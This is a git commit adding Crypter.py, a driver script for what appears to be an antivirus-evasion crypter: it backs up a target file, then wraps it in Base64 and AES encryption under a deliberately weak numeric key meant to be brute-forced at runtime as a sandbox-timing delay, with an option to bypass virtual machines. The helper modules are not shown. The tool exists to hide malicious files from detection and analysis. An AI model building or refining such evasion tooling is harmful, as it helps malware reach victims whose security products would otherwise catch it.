eafee107c9942f0de74baf8b08ec686cdae01a14
Pushpender <56433698+Technowlogy-Pushpender@users.noreply.github.com>
2020-04-23 15:08:40 +0530

    Add files via upload

---
+++ Crypter.py
@@ -0,0 +1,36 @@
+import Base64_encrypt, AES_encrypt, shutil
+
+if __name__ == '__main__':
+    notice = """
+    Cracking Speed on RunTime
+    =========================
+    With 2 GB RAM & 1 GHz Proceessor 
+    --------------------------------    
+    Guess Speed: 2000 Numeric Pass/ Seconds
+
+    Password Like : 10000 is cracked in 5 seconds
+    So Delay Time In Program Will be 5 seconds
+    
+    """
+    print(notice)
+
+    key = input("[?] Enter Numeric Weak Key : ")
+    path = input("[?] Enter Path of File : ")
+    bypassVM = input("[?] Want to BypassVM (y/n): ")
+    bypassVM = bypassVM.lower()
+    
+    print("\n[*] Making Backup ...")
+    shutil.copyfile(path, path + ".bak")
+    print("[+] Done !")
+    
+    print(f"\n[*] Initaiting Base64 Encryption Process ...")    
+    test2 = Base64_encrypt.Encrypt()
+    test2.encrypt(path)
+    print(f"[+] Operation Completed Successfully!\n")     
+
+    print("\n[*] Initiating AES Encryption Process ...")
+    test1 = AES_encrypt.Encryptor(key, path, bypassVM) 
+    test1.encrypt_file()
+    print("[+] Process Completed Successfully!")
+    
+    
